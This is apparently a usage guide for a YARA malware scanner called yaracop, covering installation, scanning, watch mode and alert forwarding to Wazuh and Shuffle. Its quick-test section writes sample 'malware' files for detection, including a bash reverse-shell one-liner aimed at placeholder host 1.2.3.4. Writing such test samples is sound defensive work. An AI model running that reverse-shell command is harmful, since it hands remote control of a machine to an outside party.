# yaracop — Complete Usage Guide (Local)

## Table of Contents
1. Prerequisites
2. Installation
3. Quick Test
4. Basic Scanning
5. Advanced Scanning
6. Watch Mode
7. Wazuh Integration
8. Shuffle Integration
9. Real-World Scenarios
10. Troubleshooting

---

## 1. Prerequisites

Before using yaracop, make sure you have:

| Requirement | Check Command | Install |
|-------------|---------------|---------|
| Python 3.10+ | `python3 --version` | `sudo apt install python3` |
| pip | `pip3 --version` | `sudo apt install python3-pip` |
| YARA library | `python3 -c "import yara"` | `pip install yara-python` |
| Git (optional) | `git --version` | `sudo apt install git` |

---

## 2. Installation

### Step 1: Clone or enter directory
```bash
cd ~/yaracop
```

### Step 2: Install Python dependencies
```bash
pip install -r requirements.txt
```

If you get `externally-managed-environment` error:
```bash
pip install --break-system-packages -r requirements.txt
```

### Step 3: Verify installation
```bash
python3 scanner.py --help
```

Expected output:
```
usage: scanner.py [-h] {scan,watch} ...
```

### Step 4: Make scripts executable (optional)
```bash
chmod +x scanner.py integration.py
```

---

## 3. Quick Test (First Scan)

### Step 1: Create a test folder with fake malware
```bash
mkdir -p /tmp/test-malware
echo "Your files have been encrypted. Pay the ransom in Bitcoin." > /tmp/test-malware/note.txt
echo "bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'" > /tmp/test-malware/shell.sh
echo "stratum+tcp://pool.minexmr.com:4444 xmrig" > /tmp/test-malware/miner.txt
```

### Step 2: Scan the test folder
```bash
cd ~/yaracop
python3 scanner.py scan --path /tmp/test-malware --rules rules/ --summary
```

### Expected output
```
✅ Compiled 1 rule file(s)
🔍 Scanning 3 file(s)...
🚨 [critical] Ransomware_Note → /tmp/test-malware/note.txt
🚨 [critical] Backdoor_ReverseShell → /tmp/test-malware/shell.sh
🚨 [high] Miner_XMRig → /tmp/test-malware/miner.txt

📊 Summary by severity:
  critical   : 2
  high       : 1
  TOTAL      : 3
```

If you see this, yaracop is working correctly.

---

## 4. Basic Scanning

### Scan a single file
```bash
python3 scanner.py scan --path /home/user/suspicious.exe --rules rules/
```

### Scan a folder (recursive)
```bash
python3 scanner.py scan --path /home/user/Downloads --rules rules/
```

### Scan with summary only
```bash
python3 scanner.py scan --path /home/user/Downloads --rules rules/ --summary
```

### Scan and save to JSON
```bash
python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json result.json
```

### Scan + JSON + summary (full)
```bash
python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json result.json --summary
```

### View JSON result
```bash
cat result.json
```

---

## 5. Advanced Scanning

### Scan multiple folders
```bash
python3 scanner.py scan --path /home/user/Downloads --rules rules/ --json dl.json
python3 scanner.py scan --path /home/user/Documents --rules rules/ --json doc.json
```

### Merge JSON results
```bash
python3 -c "
import json
a = json.load(open('dl.json'))
b = json.load(open('doc.json'))
json.dump(a + b, open('merged.json', 'w'), indent=2)
print(f'Merged: {len(a) + len(b)} alerts')
"
```

### Scan with custom rules folder
```bash
mkdir -p custom-rules
cat > custom-rules/my-rule.yar << 'EOF'
rule MyMalware {
    strings:
        $a = "evil_string"
    condition:
        $a
}
EOF

python3 scanner.py scan --path /tmp/test --rules custom-rules/
```

### Skip folders with rules
If scanning your home directory, skip `yaracop/rules/` to avoid false positives:
```bash
# Scan only Downloads (not entire home)
python3 scanner.py scan --path /home/user/Downloads --rules rules/
```

---

## 6. Watch Mode (Real-time Detection)

### Start watching a folder
```bash
python3 scanner.py watch --path /tmp/test-malware --rules rules/
```

### Watch + append to JSON
```bash
python3 scanner.py watch --path /tmp/test-malware --rules rules/ --json live.json
```

### Test watch mode
Open another terminal:
```bash
echo "Mirai botnet" > /tmp/test-malware/new-file.txt
```

The watch terminal should print:
```
🚨 [critical] Mirai → /tmp/test-malware/new-file.txt
```

### Stop watching
Press `Ctrl+C`.

---

## 7. Wazuh Integration (Optional)

### Prerequisites
- Wazuh Manager running (e.g., `https://localhost:55000`)
- Wazuh API user (default: `wazuh` / `wazuh`)

### Step 1: Scan and save JSON
```bash
python3 scanner.py scan --path /tmp/test-malware --rules rules/ --json alerts.json
```

### Step 2: Send to Wazuh
```bash
python3 integration.py wazuh \
  --alert-file alerts.json \
  --manager-url https://localhost:55000 \
  --user wazuh \
  --password wazuh
```

### Expected output
```
✅ Sent 2/2 alert(s) to Wazuh
```

### If Wazuh is not running
```
❌ Wazuh error: HTTPSConnectionPool... Connection refused
```

Fix: Start Wazuh Manager or skip this step.

---

## 8. Shuffle Integration (Optional)

### Prerequisites
- Shuffle instance running (e.g., `http://localhost:3001`)
- Webhook URL from Shuffle workflow

### Step 1: Create webhook in Shuffle
1. Open Shuffle UI
2. Create new workflow
3. Add Webhook Trigger
4. Copy webhook URL (e.g., `http://localhost:3001/api/v1/hooks/webhook_abc123`)

### Step 2: Scan and save JSON
```bash
python3 scanner.py scan --path /tmp/test-malware --rules rules/ --json alerts.json
```

### Step 3: Send to Shuffle
```bash
python3 integration.py shuffle \
  --alert-file alerts.json \
  --webhook http://localhost:3001/api/v1/hooks/webhook_abc123
```

### Expected output
```
✅ Sent 2/2 alert(s) to Shuffle
```

---

## 9. Real-World Scenarios

### Scenario A: Scan downloaded files
```bash
cd ~/Downloads
python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
```

### Scenario B: Scan USB drive
```bash
ls /media/$USER/
python3 ~/yaracop/scanner.py scan --path /media/$USER/USB_NAME --rules ~/yaracop/rules/ --summary
```

### Scenario C: Scan project folder before commit
```bash
cd ~/my-project
python3 ~/yaracop/scanner.py scan --path . --rules ~/yaracop/rules/ --summary
```

### Scenario D: Daily scan with cron
```bash
# Add to crontab
crontab -e

# Add this line (scan Downloads every day at 2 AM)
0 2 * * * cd ~/yaracop && python3 scanner.py scan --path ~/Downloads --rules rules/ --json ~/scan-$(date +\%Y\%m\%d).json
```

### Scenario E: Scan email attachments
```bash
# Extract attachments first
mkdir -p /tmp/attachments
# ... extract attachments to /tmp/attachments ...
python3 ~/yaracop/scanner.py scan --path /tmp/attachments --rules ~/yaracop/rules/ --summary
```

---

## 10. Troubleshooting

### Error: `ModuleNotFoundError: No module named 'yara'`
```bash
pip install yara-python
# or
pip install --break-system-packages yara-python
```

### Error: `No .yar/.yara files in rules/`
Check rules folder:
```bash
ls rules/
```
If empty, restore from git:
```bash
git checkout rules/malware.yar
```

### Error: `Path not found`
Check path exists:
```bash
ls /path/to/scan
```

### False positives on rules file
Don't scan `rules/` folder. Scan target folder only:
```bash
# Good
python3 scanner.py scan --path /tmp/test --rules rules/

# Bad (scans rules themselves)
python3 scanner.py scan --path ~/yaracop --rules rules/
```

### Scan is slow
- Skip large files: scan specific folders only
- Skip binary files: use `find` to filter first
```bash
find /path -type f -name "*.exe" -o -name "*.dll" | while read f; do
    python3 scanner.py scan --path "$f" --rules rules/
done
```

### Wazuh auth failed
- Check Wazuh Manager is running: `curl -k https://localhost:55000`
- Check credentials: default `wazuh` / `wazuh`
- Check API enabled in `ossec.conf`: `<api><enabled>yes</enabled></api>`

### Shuffle webhook failed
- Check Shuffle is running: `curl http://localhost:3001`
- Check webhook URL is correct
- Check network connectivity

### JSON output empty
No matches found. Check:
- Rules are loaded: `✅ Compiled N rule file(s)`
- Target folder has files: `🔍 Scanning N file(s)...`
- Files contain patterns from rules

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│  yaracop — Quick Reference                                  │
├─────────────────────────────────────────────────────────────┤
│  Scan folder:    scanner.py scan --path DIR --rules rules/  │
│  Scan + JSON:    scanner.py scan --path DIR --rules rules/  │
│                  --json out.json                            │
│  Scan + summary: scanner.py scan --path DIR --rules rules/  │
│                  --summary                                  │
│  Watch mode:     scanner.py watch --path DIR --rules rules/ │
│  Wazuh:          integration.py wazuh --alert-file F        │
│  Shuffle:        integration.py shuffle --alert-file F      │
│                  --webhook URL                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Next Steps

- Add custom YARA rules: create `rules/custom.yar`
- Integrate with Wazuh Manager (see Section 7)
- Integrate with Shuffle SOAR (see Section 8)
- Contribute to yaracop: https://github.com/InfraSecID/yaracop

---

**yaracop v1.0.0** — YARA Malware Scanner
